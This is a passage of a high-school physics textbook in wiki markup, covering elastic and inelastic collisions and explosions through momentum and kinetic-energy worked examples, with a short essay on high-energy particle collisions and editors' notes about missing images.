electrolysis  to drive electric motors in a car. The hydrogen can also be burned directly in a modified internal
combustion engine.

In both cases the  waste product is water.</text>

'''Essay 2: Tiny, Violent Collisions'''

Author: Thomas D. Gutierrez

Tom Gutierrez received his Bachelor of Science and Master degrees in physics from San Jose State University in his home town of San Jose, California. As
a Master's student he helped work on a laser spectrometer at NASA Ames Research Centre. The instrument measured the ratio of different isotopes of
carbon in ''CO''&lt;sub&gt;2&lt;/sub&gt; gas and could be used for such diverse applications as medical diagnostics and space exploration. Later, he received his Ph.D. in
physics from the University of California, Davis where he performed calculations for various reactions in high energy physics collisions. He
currently lives in Berkeley, California where he studies proton-proton collisions seen at the STAR experiment at Brookhaven National Laboratory on
Long Island, New York.

=High Energy Collisions=
Take an orange and expanded it to the size of the earth. The atoms of the earth-sized orange would themselves be about the size of regular oranges and
would fill the entire ''earth-orange''. Now, take an atom and expand it to the size of a football field. The nucleus of that atom would be about the
size of a tiny seed in the middle of the field. From this analogy, you can see that atomic nuclei are very small objects by human standards. They are
roughly 10&lt;sup&gt;-15&lt;/sup&gt; meters in diameter - one-hundred thousand times smaller than a typical atom. These nuclei cannot be seen or studied via any
conventional means such as the naked eye or microscopes. So how do scientists study the structure of very small objects like atomic nuclei?

The simplest nucleus, that of hydrogen, is called the proton. Faced with the inability to isolate a single proton, open it up, and directly examine
what is inside, scientists must resort to a brute-force and somewhat indirect means of exploration: high energy collisions. By colliding protons
with other particles (such as other protons or electrons) at very high energies, one hopes to learn about what they are made of and how they work.
The American physicist Richard Feynman once compared this process to slamming delicate watches together and figuring out how they work by only
examining the broken debris. While this analogy may seem pessimistic, with sufficient mathematical models and experimental precision, considerable
information can be extracted from the debris of such high energy subatomic collisions. One can learn about both the nature of the forces at work and
also about the sub-structure of such systems. 

The experiments are in the category of ''high energy physics'' (also known as ''subatomic'' physics). The primary tool of scientific exploration in
these experiments is an extremely violent collision between two very, very small subatomic objects such as nuclei. As a general rule, the higher the
energy of the collisions, the more detail of the original system you are able to resolve. These experiments are operated at laboratories such as
CERN, SLAC, BNL, and Fermilab, just to name a few. The giant machines that perform the collisions are roughly the size of towns. For example, the RHIC
collider at BNL is a ring about 1 km in diameter and can be seen from space. The newest machine currently being built, the LHC at CERN, is a ring 9 km in
diameter!

Let's examine the kinematics of such a collisions in some detail...</text>

In most physics courses questions about collisions and explosions occur and to solve these we must use the ideas of momentum and energy  with a bit of
mathematics of course! This section allows you to pull the momentum and energy ideas together easily with some specific problems.</text>

=Types of Collisions =

We will consider two types of collisions in this section

* Elastic collisions
* Inelastic collisions

In both types of collision, total energy and total momentum is always conserved. Kinetic energy is conserved for elastic collisions, but not for
inelastic collisions.

==Elastic Collisions ==

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; | '''Definition:''' 
|- 
| align=&quot;CENTER&quot; | An elastic collision is a collision where total momentum and total kinetic energy are both conserved.
|}
&lt;/blockquote&gt;

This means that the total momentum and the total kinetic energy before an elastic collision is the same as after the collision. For these kinds of
collisions, the kinetic energy is not changed into another type of energy.


===Before the Collision ===

In the following diagram,two balls are rolling toward each other, about to collide

[[Image:Fhsst_expl1.png|354px|]]

Before the balls collide, the total momentum of the system is equal to all the individual momenta added together. The ball on the left has a momentum which we call &lt;math&gt;\overrightarrow{p}_1&lt;/math&gt; and the ball on the right has a momentum which we call &lt;math&gt;\overrightarrow{p}_2&lt;/math&gt;, it means the total momentum before the collision is 

{| 
|-
|&lt;math&gt;\begin{matrix}\overrightarrow{p}_\mathrm{Before} = \overrightarrow{p}_1+\overrightarrow{p}_2\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | (8.1)
|}

We calculate the total kinetic energy of the system in the same way. The ball on the left has a kinetic energy which we call ''K''&lt;sub&gt;1&lt;/sub&gt; and the ball on the right has a kinetic energy which we call ''K''&lt;sub&gt;2&lt;/sub&gt;, it means that the total kinetic energy before the collision is

{| 
|-
|&lt;math&gt;\begin{matrix}K_\mathrm{Before} = K_1+K_2\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | (8.2)
|}

=== After the Collision ===

The following diagram shows the balls after they collide

[[Image:Fhsst_expl2.png|271px|]]

After the balls collide and bounce off each other, they have new momenta and new kinetic energies. Like before, the total momentum of the system is equal to all the individual momenta added together. The ball on the left now has a momentum which we call &lt;math&gt;\overrightarrow{p}_3&lt;/math&gt; and the ball on the right now has a  momentum which we call &lt;math&gt;\overrightarrow{p}_4&lt;/math&gt;, it means the total momentum after the collision is 


{| 
|-
|&lt;math&gt;\begin{matrix}\overrightarrow{p}_\mathrm{After} = \overrightarrow{p}_3+\overrightarrow{p}_4\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(8.3)
|}

The ball on the left now has a kinetic energy which we call ''K''&lt;sub&gt;3&lt;/sub&gt; and the ball on the right now has a kinetic energy which we call ''K''&lt;sub&gt;4&lt;/sub&gt;, it means that the total kinetic energy after the collision is

{| 
|-
|&lt;math&gt;\begin{matrix}K_\mathrm{After} = K_3+K_4\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(8.4)
|}

Since this is an ''elastic'' collision, the total momentum before the collision equals the total momentum after the collision and the total kinetic energy before the collision equals the total kinetic energy after the collision

&lt;math&gt;\begin{matrix}\mbox{Before}&amp;&amp;\mbox{After}\\\overrightarrow{p}_\mathrm{Before} &amp;=&amp; \overrightarrow{p}_\mathrm{After}\\\overrightarrow{p}_1+\overrightarrow{p}_2 &amp;=&amp;\overrightarrow{p}_3+\overrightarrow{p}_4 \\&amp;\rm {\textbf{and}}&amp;\\K_\mathrm{Before} &amp;=&amp; K_\mathrm{After} \\K_1+K_2 &amp;=&amp; K_3+K_4\end{matrix}&lt;/math&gt;

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 46 An Elastic Collision===
We will have a look at the collision between two pool balls. Ball 1 is at rest and ball 2 is moving towards it with a speed of 2 m·s&lt;sup&gt;&amp;minus;1&lt;/sup&gt;. The mass of each ball is 0.3 kg. After the balls collide elastically, ball 2 comes to a stop and ball 1 moves off. What is the final velocity of ball 1?

Step 1 : Draw the ''before'' diagram

Before the collision, ball 2 is moving  we will call it's momentum ''P''&lt;sub&gt;2&lt;/sub&gt; and it's kinetic energy ''K''&lt;sub&gt;2&lt;/sub&gt;. Ball 1 is at rest, so it has zero kinetic energy and momentum.

[[Image:Fhsst_expl3.png|314px|]]

Step 2 : Draw the ''after'' diagram

After the collision, ball 2 is at rest but ball 1 has a momentum which we call ''P''&lt;sub&gt;3&lt;/sub&gt; and a kinetic energy which we call ''K''&lt;sub&gt;3&lt;/sub&gt;.

'''RIAAN Note: second image on page 145 is missing'''

[[Image:Fhsst_expl4.png|314px|]]

Because the collision is elastic, we can solve the problem using momentum conservation or kinetic energy conservation. We will do it both ways to show that the answer is the same, whichever method you use.

Step 3 : Show the conservation of momentum

We start by writing down that the momentum before the collision &lt;math&gt;\overrightarrow{p}_\mathrm{Before}&lt;/math&gt; is equal to the momentum after the collision &lt;math&gt;\overrightarrow{p}_\mathrm{After}&lt;/math&gt;


{| 
|-
|&lt;math&gt;\begin{matrix}\mbox{Before}&amp;&amp;\mbox{After}\\\overrightarrow{p}_\mathrm{Before}&amp;=&amp;\overrightarrow{p}_\mathrm{After}\\\overrightarrow{p}_1+\overrightarrow{p}_2&amp;=&amp;\overrightarrow{p}_3+\overrightarrow{p}_4\\0+\overrightarrow{p}_2&amp;=&amp;\overrightarrow{p}_3+0\\\overrightarrow{p}_2&amp;=&amp;\overrightarrow{p}_3\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(8.7)
|}

We know that momentum is just ''P'' = ''mv'', and we know the masses of the balls, so we can rewrite the conservation of momentum in terms of the velocities of the balls

{| 
|-
|&lt;math&gt;\begin{matrix}\overrightarrow{p}_2&amp;=&amp;\overrightarrow{p}_3\\m_2v_2&amp;=&amp;m_3v_3\\0.3v_2&amp;=&amp;0.3v_3\\v_2&amp;=&amp;v_3\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(8.8)
|}

So ball 1 exits with the velocity that ball 2 started with!


{| 
|-
|&lt;math&gt;\begin{matrix}v_3=2[\mathrm{m.s^{-1}}]\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(8.9)
|}


Step 4 : Show the conservation of kinetic energy

We start by writing down that the kinetic energy before the collision &lt;math&gt;K_\mathrm{Before}&lt;/math&gt; is equal to the kinetic energy after the collision &lt;math&gt;K_\mathrm{After}&lt;/math&gt;

{| 
|-
|&lt;math&gt;\begin{matrix}\mbox{Before}&amp;&amp;\mbox{After}\\K_\mathrm{Before}&amp;=&amp;K_\mathrm{After}\\K_1+K_2 &amp;=&amp; K_3+K_4\\0+K_2&amp;=&amp;K_3+0\\K_2&amp;=&amp;K_3\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(8.10)
|}

We know that kinetic energy is just &lt;math&gt;K=\frac{mv^2}{2}&lt;/math&gt;, and we know the masses of the balls, so we can rewrite the conservation of kinetic energy in terms of
the velocities of the balls

So ball 1 exits with the velocity that ball 2 started with, which agrees with the answer we got when we used the conservation of momentum.

===Worked Example 47 Elastic Collision 2===
'''Question:''' Now for a slightly more difficult example. We have 2 marbles. Marble 1 has mass 50 g and marble 2 has mass
100&amp;nbsp g. I roll marble 2 along the ground towards marble 1 in the positive ''x''-direction. Marble 1 is initially at rest and marble 2
has a velocity of 3 &lt;math&gt;\mathrm{m.s^{-1}}&lt;/math&gt; in the positive ''x''-direction. After they collide elastically, both marbles are moving. What is
the final velocity of each marble?

'''Answer:'''

Step 1 : 

Firstly, put all the quantities into S.I. units. So:

&lt;center&gt;&lt;math&gt;\begin{matrix}m_{1} = 0.05 \rm {kg} &amp;\rm {and} &amp; m_{2} = 0.1\rm {kg}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 2 : 

Draw the picture:

&lt;u&gt;Before the collision:&lt;/u&gt;

[[Image:Fhsst_expl5.png|372px|]]


&lt;u&gt;After the collision:&lt;/u&gt;

[[Image:Fhsst_expl6.png|372px|]]

Step 3 : 

Since the collision is elastic, both momentum and kinetic energy are conserved in the collision. So:

&lt;center&gt;&lt;math&gt;\begin{matrix}E_{kBefore} &amp;=&amp; E_{kAfter} \\&amp;\rm {and}&amp; \\\overrightarrow{p_{Before}} &amp;=&amp; \overrightarrow{p_{After}}\end{matrix}&lt;/math&gt;&lt;/center&gt;

There are two unknowns (&lt;math&gt;\overrightarrow{v_{1}}&lt;/math&gt; and &lt;math&gt;\overrightarrow{v_{2}}&lt;/math&gt;) so we will need two equations to solve for them. We need to use both kinetic energy
conservation and momentum conservation in this problem.

Step 4 : 
Let's start with energy conservation. Then:

&lt;center&gt;&lt;math&gt;\begin{matrix}E_{kBefore} &amp;=&amp; E_{kAfter} \\\frac{1}{2}m_{1}{\overrightarrow{u_{1}}}^2 +\frac{1}{2}m_{2}{\overrightarrow{u_{2}}}^2 &amp;=&amp;\frac{1}{2}m_{1}{\overrightarrow{v_{1}}}^2+ \frac{1}{2}m_{2}{\overrightarrow{v_{2}}}^2 \\m_{1}{\overrightarrow{u_{1}}}^2 + m_{2}{\overrightarrow{u_{2}}}^2 &amp;=&amp;m_{1}{\overrightarrow{v_{1}}}^2+ m_{2}{\overrightarrow{v_{2}}}^2 \\\end{matrix}&lt;/math&gt;&lt;/center&gt;

But &lt;math&gt;\overrightarrow{u_{1}}&lt;/math&gt;, and solving for &lt;math&gt;{\overrightarrow{v_{2}}}^2&lt;/math&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}{\overrightarrow{v_{2}}}^2 &amp;=&amp;{\overrightarrow{u_{2}}}^2-\frac{m1}{m2}{\overrightarrow{v_{1}}}^2\\{\overrightarrow{v_{2}}}^2 &amp;=&amp; (3)^2 - \frac{(0.05)}{(0.10)}{\overrightarrow{v_{1}}}^2\\{\overrightarrow{v_{2}}}^2 &amp;=&amp; 9-\frac{1}{2}{\overrightarrow{v_{1}}}^2\rm {\ \ \ \ (\textbf{A})}\\\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 5 : 
Now we have simplified as far as we can, we move onto momentum conservation:

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p_{Before}} &amp;=&amp; \overrightarrow{p_{After}} \\m_{1}\overrightarrow{u_{1}} + m_{2}\overrightarrow{u_{2}} &amp;=&amp;m_{1}\overrightarrow{v_{1}}+m_{2}\overrightarrow{v_{2}} \\\end{matrix}&lt;/math&gt;&lt;/center&gt;

But &lt;math&gt;\overrightarrow{u_{1}}&lt;/math&gt;=0, and solving for &lt;math&gt;\overrightarrow{v_{1}}&lt;/math&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}m_{2}\overrightarrow{u_{2}} &amp;=&amp; m_{1}\overrightarrow{v_{1}}+m_{2}\overrightarrow{v_{2}} \\m_{1}\overrightarrow{v_{1}} &amp;=&amp; m_{2}\overrightarrow{u_{2}} - m_{2}\overrightarrow{v_{2}}\\\overrightarrow{v_{1}} &amp;=&amp; \frac{m_{2}}{m_{1}}\overrightarrow{u_{2}} -\frac{m_{2}}{m_{1}}\overrightarrow{v_{2}}\\\overrightarrow{v_{1}} &amp;=&amp; 2(3) - 2\overrightarrow{v_{2}}\\\overrightarrow{v_{1}} &amp;=&amp; 6 - 2\overrightarrow{v_{2}} \rm {\ \ \ \ (\textbf{B})}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 6 : 

Now we can substitute (B) into (A) to solve for &lt;math&gt;\overrightarrow{v_{2}}&lt;/math&gt;:

&lt;center&gt;&lt;math&gt;\begin{matrix}{\overrightarrow{v_{2}}}^2 &amp;=&amp; 9-\frac{1}{2}{\overrightarrow{v_{1}}}^2\\{\overrightarrow{v_{2}}}^2 &amp;=&amp; 9 - \frac{1}{2}(6-2\overrightarrow{v_{2}})^2 \\{\overrightarrow{v_{2}}}^2 &amp;=&amp; 9 - \frac{1}{2}(36-24\overrightarrow{v_{2}}+4{\overrightarrow{v_{2}}}^2) \\{\overrightarrow{v_{2}}}^2 &amp;=&amp; 9 - 18 + 12\overrightarrow{v_{2}}-2{\overrightarrow{v_{2}}}^2 \\3{\overrightarrow{v_{2}}}^2 &amp;=&amp; -9 + 12\overrightarrow{v_{2}} \\{\overrightarrow{v_{2}}}^2 &amp;=&amp; 4\overrightarrow{v_{2}} -3 \\{\overrightarrow{v_{2}}}^2 -4\overrightarrow{v_{2}} +3 &amp;=&amp; 0 \\(\overrightarrow{v_{2}}-3)(\overrightarrow{v_{2}}-1)&amp;=&amp; 0 \\\overrightarrow{v_{2}}=3 &amp;\rm {\textbf{or}}&amp; \overrightarrow{v_{2}}=1\end{matrix}&lt;/math&gt;&lt;/center&gt;

We were lucky in this question because we could factorise. If you can't factorise, then you can always solve using the formula for solving quadratic equations. Remember:

&lt;center&gt;&lt;math&gt;\begin{matrix}x = \frac{-b \pm \sqrt{b^2 - 4ac}}{2a}\end{matrix}&lt;/math&gt;&lt;/center&gt;

So, just to check:

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{v_{2}} &amp;=&amp; \frac{4 \pm \sqrt{4^2 - 4(1)(3)}}{2(1)} \\\overrightarrow{v_{2}} &amp;=&amp; \frac{4 \pm \sqrt{16 - 12}}{2} \\\overrightarrow{v_{2}} &amp;=&amp; \frac{4 \pm \sqrt{4}}{2} \\\overrightarrow{v_{2}} &amp;=&amp; 2 \pm 1 \\\overrightarrow{v_{2}}=3 &amp;\rm {\textbf{or}}&amp; \overrightarrow{v_{2}}=1\rm {\ \ same \ as \ before}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 7 : 

So finally, substituting into equation (B) to get &lt;math&gt;\overrightarrow{v_{1}}&lt;/math&gt;:

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{v_{1}}=6-2\overrightarrow{v_{2}} \\\end{matrix}&lt;/math&gt;&lt;/center&gt;

If &lt;math&gt;\overrightarrow{v_{2}}= 3 \ \mathrm{m.s^{-1}}&lt;/math&gt; then

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{v_{1}}=6-2(3) = 0 \ \mathrm{m.s^{-1}}\end{matrix}&lt;/math&gt;&lt;/center&gt;


But, according to the question, marble 1 is moving after the collision. So &lt;math&gt;\overrightarrow{v_{1}} \neq 0&lt;/math&gt; and &lt;math&gt;\overrightarrow{v_{2}} \neq 3&lt;/math&gt;. Therefore: 

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{v_{2}} &amp;=&amp; \underline{1 \ \mathrm{m.s^{-1}}\rm {\ \ \ in \ the \ positive \ x-direction}}\\&amp;\rm {and}&amp; \\\overrightarrow{v_{1}} &amp;=&amp; \underline{4 \ \mathrm{m.s^{-1}}\rm {\ \ \ in \ the \ positive \ x-direction}}\\\end{matrix}&lt;/math&gt;&lt;/center&gt;

==Inelastic Collisions ==
&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; | '''Definition:''' 
|- 
| align=&quot;CENTER&quot; | An inelastic collision is a collision in which total momentum is conserved but total kinetic energy is not conserved 
|- 
| align=&quot;CENTER&quot; | the kinetic energy is transformed into other kinds of energy.
|}
&lt;/blockquote&gt;

So the total momentum before an inelastic collisions is the same as after the collision. But the total kinetic energy before and after the
inelastic collision is different. Of course this does not mean that total energy has not been conserved, rather the energy has been transformed into another type of energy.

As a rule of thumb, inelastic collisions happen when the colliding objects are distorted in some way. Usually they change their shape. To modify
the shape of an object requires energy and this is where the ''missing'' kinetic energy goes. A classic example of an inelastic collision is a car crash. The cars change shape and there is a noticeable change in the kinetic energy of the cars before and after the collision. This energy was
used to bend the metal and deform the cars. Another example of an inelastic collision is shown in the following picture. 

Here an asteroid (the small circle) is moving through space towards the moon (big circle).
&lt;u&gt;Before&lt;/u&gt; the moon and the asteroid collide, the total momentum of the system is:

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p_{Before}} = \overrightarrow{p_{m}}+\overrightarrow{p_{a}}\end{matrix}&lt;/math&gt;&lt;/center&gt;

&lt;math&gt;\overrightarrow{p_{m}}&lt;/math&gt; stands for &lt;math&gt;\overrightarrow{p_{moon}}&lt;/math&gt; and &lt;math&gt;\overrightarrow{p_{a}}&lt;/math&gt; stands for &lt;math&gt;\overrightarrow{p_{asteroid}}&lt;/math&gt; and the total kinetic energy of the system is:

&lt;center&gt;&lt;math&gt;\begin{matrix}E_{Before} = E_{km} + E_{ka}\end{matrix}&lt;/math&gt;&lt;/center&gt;

[[Image:Fhsst_expl7.png|381px|]]

When the asteroid collides '''inelastically''' with the moon, its kinetic energy is transformed mostly into heat energy. If this heat energy is large enough, it can cause the asteroid and the area of the moon's surface that it hit, to melt into liquid rock! From the force of impact of the asteroid, the molten rock flows outwards to form a moon crater. 

[[Image:Fhsst_expl8.png|381px|]]

&lt;u&gt;After&lt;/u&gt; the collision, the total momentum of the system will be the same as before. But since this collision is inelastic, (and you can see that a change in the shape of objects has taken
place!), total kinetic energy is not the same as before the collision. 

[[Image:Fhsst_expl9.png|363px|]]

So:

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p_{Before}} &amp;=&amp; \overrightarrow{p_{After}} \\\overrightarrow{p_{m}}+\overrightarrow{p_{a}} &amp;=&amp;\overrightarrow{p_{After}} \\&amp;\rm {\textbf{but}}&amp; \\E_{kBefore} &amp;\neq&amp; E_{kAfter} \\E_{km} + E_{ka} &amp;\neq&amp; E_{kAfter}\end{matrix}&lt;/math&gt;&lt;/center&gt;

&lt;hr style=&quot;background-color:red&quot; /&gt;

===Worked Example 48 Inelastic Collision===

'''Question:''' Let's consider the collision of two cars. Car 1 is at rest and Car 2 is moving at a speed of &lt;math&gt;2\mathrm{m.s^{-1}}&lt;/math&gt; in the negative ''x''-direction. Both cars each have a mass of 500kg. The cars collide inelastically and stick together. What is the resulting velocity of the resulting mass of metal?

'''Answer:'''

Step 1 : 

Draw the picture:
&lt;u&gt;Before the collision:&lt;/u&gt;

[[Image:Fhsst_expl10.png|372px|]]

&lt;u&gt;After the collision:&lt;/u&gt;

[[Image:Fhsst_expl11.png|372px|]]

Step 2 : 

We know the collision is inelastic and there was a definite change in shape of the objects involved in the collision - there were two objects to start and after the collision there was one big mass of
metal! Therefore, we know that kinetic energy is not conserved in the collision but total momentum is conserved. 

So:

&lt;center&gt;&lt;math&gt;\begin{matrix}E_{kBefore} &amp; \neq &amp; E_{kAfter} \\&amp; \rm {\textbf{but}} &amp; \\\overrightarrow{p_{TBefore}} &amp; = &amp; \overrightarrow{p_{After}}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 3 : 

So we must use conservation of momentum to solve this problem. Take the negative ''x''-direction to have a negative sign:

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p_{TBefore}} &amp; = &amp; \overrightarrow{p_{After}} \\\overrightarrow{p_{1}} + \overrightarrow{p_{2}} &amp;=&amp;\overrightarrow{p_{After}} \\m_{1}\overrightarrow{u_{1}} + m_{2}\overrightarrow{u_{2}} &amp;=&amp; (m_{1} +m_{2})\overrightarrow{v} \\0 + 500(-2) &amp;=&amp; (500+500)\overrightarrow{v} \\-1000 &amp;=&amp; 1000\overrightarrow{v} \\\overrightarrow{v} &amp;=&amp; -1 \ \mathrm{m.s^{-1}}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Therefore,

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{v} = \underline{1 \ \mathrm{m.s^{-1}}\rm {\ in \ the \ negative \ x-direction} }\end{matrix}&lt;/math&gt;&lt;/center&gt;</text>

= Explosions =

When an object explodes, it breaks up into more than one piece and it therefore changes its shape. Explosions occur when energy is transformed from one kind ''e.g. chemical potential energy'' to another ''e.g. heat energy'' or kinetic energy extremely quickly. 

So, like in inelastic collisions, total kinetic energy is not conserved in explosions. But total momentum is always conserved. Thus if the momenta of some of the parts of the exploding object are measured, we can use momentum conservation to solve the problem! 

&lt;hr style=&quot;background-color:red&quot; /&gt;

The Tunguska event was an aerial explosion that occurred near the Podkamennaya (Stony) Tunguska River in what is now Evenkia, Siberia, at 7:17 AM on June 30, 1908. The size of the blast was
later estimated to be equivalent to between 10 and 15 million tons of regular explosive. It felled an estimated 60 million trees over 2,150 square kilometers.

At around 7:15 AM, Tungus natives and Russian settlers in the hills northwest of Lake Baikal observed a huge fireball moving across the sky, nearly as bright as the Sun. A few minutes later, there was a flash that lit up half of the sky, followed by a shock wave that knocked people off their feet and broke windows up to 650 km away (the same as the distance from Bloemfontein to Durban!). The explosion registered on seismic stations across Europe and Asia, and produced fluctuations in atmospheric pressure strong enough to be detected in Britain. Over the next few weeks, night skies over Europe and western Russia glowed brightly enough for people to read
by.

Had the object responsible for the explosion hit the Earth a few hours later, it would have exploded over Europe instead of the sparsely-populated Tunguska region, producing massive loss of human
life.

In the following picture, a closed can of baked beans is put on a
stove or fire:

[[Image:Fhsst_expl13.png|372px|]]

&lt;u&gt;Before&lt;/u&gt; the can heats up and explodes, the total momentum
of the system is:

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p_{Before}} &amp;=&amp; \overrightarrow{p_{can}} \\&amp;=&amp; 0\end{matrix}&lt;/math&gt;&lt;/center&gt;

and the total kinetic energy of the system is:

&lt;center&gt;&lt;math&gt;\begin{matrix}E_{kBefore} &amp;=&amp; E_{kcan} \\&amp;=&amp; 0\end{matrix}&lt;/math&gt;&lt;/center&gt;

since the can isn't moving.Once the mixture of beans, juice and air inside the can reach a certain temperature, the pressure inside the can becomes so great that the can explodes! Beans and sharp pieces of metal can fly out in all directions. Energy in the system has been transformed from heat energy into kinetic energy. 

[[Image:Fhsst_expl14.png|372px|]]

&lt;u&gt;After&lt;/u&gt; the explosion, the c an is completely destroyed. But momentum is always conserved, so:

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p_{Before}} &amp;=&amp; \overrightarrow{p_{After}} \\\overrightarrow{p_{Before}} &amp;=&amp; \overrightarrow{p_{1}} +\overrightarrow{p_{2}} +\overrightarrow{p_{3}} + \overrightarrow{p_{4}}\\0 &amp;=&amp; \overrightarrow{p_{1}} +\overrightarrow{p_{2}} +\overrightarrow{p_{3}} + \overrightarrow{p_{4}}\end{matrix}&lt;/math&gt;&lt;/center&gt;

However, the kinetic energy of the system is not conserved. The can's shape was changed in the explosion. Before the explosion the can was not moving, but after the explosion, the pieces
of metal and baked beans were moving when they were flying out in all directions! So:

&lt;center&gt;&lt;math&gt;\begin{matrix}E_{kB} \neq E_{kA}\end{matrix}&lt;/math&gt;&lt;/center&gt;

&lt;/blockquote&gt;

==Worked Example 49 Explosions 1==

'''Question:''' An object with mass ''m''&lt;sub&gt;Tot&lt;/sub&gt; = 10 kg is sitting at rest. Suddenly it explodes into two pieces. One piece has a mass of ''m''&lt;sub&gt;1&lt;/sub&gt; = 5 kg and moves off in the
negative x-direction at &lt;math&gt;\overrightarrow{v_1}=3{m}{s^{-1}}&lt;/math&gt;. What is the velocity of the other piece? 

'''Answer:'''

Step 1 : 

Draw the picture. &lt;u&gt;Before&lt;/u&gt; the explosion, the object is at rest:

[[Image:Fhsst_expl15.png|372px|]]


&lt;u&gt;After&lt;/u&gt; the explosion, the two pieces move off:

'''Riaan Note: second image on page 154 is missing'''

[[Image:Fhsst_expl16.png|372px|]]

Step 2 : 

Now we know that in an explosion, total kinetic energy is not conserved. There is a definite change in shape of the exploding object! But we can always use momentum conservation to solve the problem. 

So:

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p_{Before}} &amp;=&amp; \overrightarrow{p_{After}} \\\overrightarrow{p_{Before}} &amp;=&amp; \overrightarrow{p_{1}} + \overrightarrow{p_{2}}\end{matrix}&lt;/math&gt;&lt;/center&gt;

But the object was initially at rest so:

&lt;center&gt;&lt;math&gt;\begin{matrix}0 &amp;=&amp; \overrightarrow{p_{1}} + \overrightarrow{p_{2}}\\0 &amp;=&amp; m_{1}\overrightarrow{v_{1}} + m_{2}\overrightarrow{v_{2}} \rm {\qquad (\textbf{A})}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 3 : 

Now we know that ''m''&lt;sub&gt;1&lt;/sub&gt;= 5 kg but we do not know what the mass of ''m''&lt;sub&gt;2&lt;/sub&gt; is. However, we do know that:

&lt;center&gt;&lt;math&gt;\begin{matrix}m_{Tot} &amp;=&amp; m_1+m_2 \\m_2 &amp; =&amp; m_{Tot} -m_1 \\&amp;=&amp;10 \rm {\ kg}-5 \rm {\ kg} \\&amp;=&amp;5 \rm {\ kg}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 4 : 

Now we can substitute all the values we know into equation (A) and solve for &lt;math&gt;\overrightarrow{v_{2}}&lt;/math&gt;. Let's choose the positive ''x''-direction to have a postive sign and the negative ''x''-direction to have a negative sign:

&lt;center&gt;&lt;math&gt;\begin{matrix}0 &amp;=&amp; m_{1}\overrightarrow{v_{1}} + m_{2}\overrightarrow{v_{2}} \rm {\qquad (\textbf{A})} \\0 &amp;=&amp; 5(-3) + 5\overrightarrow{v_{2}} \\0 &amp;=&amp; -15 + 5\overrightarrow{v_{2}} \\5\overrightarrow{v_{2}} &amp;=&amp; 15 \\\overrightarrow{v_{2}} &amp;=&amp; +3 \rm {\ \mathrm{m.s^{-1}}}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Therefore,

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{v_{2}} = \underline{3 \ \mathrm{m.s^{-1}}\rm {\ in \ the \ positive \ x-direction.} }\end{matrix}&lt;/math&gt;&lt;/center&gt;

==Worked Example 50 Explosions 2==

'''Question:''' An object with mass ''m''&lt;sub&gt;Tot&lt;/sub&gt; =15 kg is sitting at rest. Suddenly it explodes into two pieces. One piece has a mass of ''m''&lt;sub&gt;1&lt;/sub&gt; = 5000 g and moves off in the
positive x-direction at &lt;math&gt;v_1=7{m}{s^{-1}}&lt;/math&gt;. What is the final velocity of the other piece? 

'''Answer:'''

Step 1 : 

Draw the picture. &lt;u&gt;Before&lt;/u&gt; the collision:

&lt;u&gt;After&lt;/u&gt; the collision:

'''Riaan Note: image on page 156 is missing'''

Step 2 : 

Convert all units into S.I. units:

&lt;center&gt;&lt;math&gt;\begin{matrix}m_{1} &amp;=&amp; 5000 \rm {\ g} \\m_{1} &amp;=&amp; 5 \rm {\ kg}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 3 : 

Now we know that in an explosion, total kinetic energy is not conserved. There is a definite change in shape of the exploding object! But we can always use momentum conservation to solve the problem. So:

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{p_{Before}} &amp;=&amp; \overrightarrow{p_{After}} \\\overrightarrow{p_{Before}} &amp;=&amp; \overrightarrow{p_{1}} + \overrightarrow{p_{2}}\end{matrix}&lt;/math&gt;&lt;/center&gt;

But the object was initially at rest so:

&lt;center&gt;&lt;math&gt;\begin{matrix}0 &amp;=&amp; \overrightarrow{p_{1}} + \overrightarrow{p_{2}}\\0 &amp;=&amp; m_{1}\overrightarrow{v_{1}} + m_{2}\overrightarrow{v_{2}} \rm {\qquad (\textbf{A})}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 4 : 

